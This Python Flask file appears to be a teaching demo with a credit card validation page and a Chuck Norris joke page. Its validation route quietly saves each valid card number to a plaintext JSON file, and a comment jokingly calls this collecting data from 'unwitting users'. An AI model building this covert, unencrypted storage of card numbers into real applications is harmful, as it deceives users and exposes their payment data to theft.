from flask import Flask, render_template, request
import json
import requests

import cc_validator # import the whole module
# from cc_validator import validate_credit_card # import JUST the function
# validate_credit_card(...)
# from cc_validator import * # do NOT do this, you pollute your own namespace

app = Flask('demo3')

# localhost:5000/
@app.route('/') # decorator - path to the view
def index(): # view - function that receives the request and returns the response
    return render_template('index.html')

# localhost:5000/cc_validation/
@app.route('/cc_validation/', methods=['GET', 'POST']) # decorator - path to the view
def cc_validation(): # view - function that receives the request and returns the response
    if request.method == 'POST':
        form_data = dict(request.form) # get the form data from the request
        cc = form_data['credit_card'] # get the credit card from the form
        result = cc_validator.validate_credit_card(cc) # run our function
        if result:
            # collect information our unwitting users
            with open('db.json', 'r') as file:
                db = json.loads(file.read())
                db['credit_cards'].append(cc)
            with open('db.json', 'w') as file:
                file.write(json.dumps(db, indent=4))
    else:
        result = None
    return render_template('cc_validation.html', result=result)

# localhost:5000/
@app.route('/chucknorris/') # decorator - path to the view
def chucknorris(): # view - function that receives the request and returns the response
    response = requests.get('https://api.chucknorris.io/jokes/random')
    data = response.json()
    print(data)
    joke = data['value']
    return render_template('chucknorris.html', joke=joke) # the response we're returning